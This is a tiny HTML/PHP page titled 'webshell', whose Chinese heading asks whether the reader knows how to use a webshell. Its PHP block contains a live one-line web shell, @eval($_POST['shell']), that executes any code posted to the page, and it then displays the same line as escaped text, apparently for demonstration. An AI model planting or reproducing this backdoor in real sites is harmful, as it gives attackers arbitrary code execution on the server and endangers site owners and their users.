<html>
<head>
    <meta charset="UTF-8">
    <title>webshell</title>
</head>
<body>
<h3>你会使用webshell吗？</h3>

<?php
@eval($_POST['shell']);
$str = '<?php @eval($_POST[\'shell\']);?>';
echo htmlentities($str, ENT_QUOTES, "UTF-8");
?>
</body>
